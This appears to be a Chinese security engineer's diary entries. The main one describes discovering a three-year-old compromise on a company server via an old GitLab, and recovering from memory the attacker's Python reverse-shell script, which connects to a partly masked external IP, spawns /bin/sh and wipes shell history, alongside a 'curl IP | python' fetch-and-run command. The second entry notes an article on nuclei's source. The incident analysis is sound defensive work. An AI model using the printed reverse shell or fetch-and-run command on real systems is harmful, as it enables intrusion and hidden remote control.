
# 2021.09.09

在一台好久没注意的公司服务器上发现了这个  

```bash
1000     32702  0.0  0.0  。。。  。。。 ?        S     2018   0:00 /bin/bash -c curl IP | python
1000     32703  0.0  0.0  40896  5280  ?        S     2018   0:00 python
1000     32704  0.0  0.0   4464   428 pts/0    Ss+   2018   0:00 /bin/sh
```

乍一看，标准的挖矿啊，有木有，IP能访问，但是404。开始以为是谁测试用的，直接kill了32702  
后来觉得没这么简单，毕竟2018年运行的，幸好留有后边的32703和32704，`lsof -p 32703`发现和gitlab有关，那就基本明白了  
该服务器上有个年久失修的gitlab一直在跑着，但是，运行的Python代码到底是什么，期间根本没有落盘  
这个时候当然是去找`/proc`目录了，或者`gcore 32703`直接生成内存转储，只需要`strings`一下，仔细找一下就能发现  

```python
# -*- coding:utf-8 -*-
#!/usr/bin/env python
#back connect py version,only linux have pty module
#code by google security team
import sys,os,socket,pty
shell = "/bin/sh"
def usage(name):
    print 'python reverse connector'
    print 'usage: %s <ip_addr> <port>' % name
def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect(('47.91.225.XXX',1433))
        print 'connect ok'
    except:
        print 'connect faild'
        sys.exit()
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    global shell
    os.unsetenv("HISTFILE")
    os.unsetenv("HISTFILESIZE")
    os.unsetenv("HISTSIZE")
    os.unsetenv("HISTORY")
    os.unsetenv("HISTSAVE")
    os.unsetenv("HISTZONE")
    os.unsetenv("HISTLOG")
    os.unsetenv("HISTCMD")
    os.putenv("HISTFILE",'/dev/null')
    os.putenv("HISTSIZE",'0')
    os.putenv("HISTFILESIZE",'0')
    pty.spawn(shell)
    s.close()
if name == 'main':
    main()
```

直接反弹啊，三年啊  
究竟由于Gitlab哪个洞被打的，反弹之后又执行了什么命令。。。

# 2021.08.20

[projectdiscovery之nuclei源码阅读](https://xz.aliyun.com/t/9988)  
nuclei在国内似乎并不火  
文章提到了“nuclei的最新版本支持基于chromium的headless访问”，可以通过yaml定义事件  
代码里有“go类型中的interface可以看成是任意类型，但是在使用时需要将他转换成我们指定的类型”，实际具体用的https://github.com/spf13/cast，可以用于fuzz了  

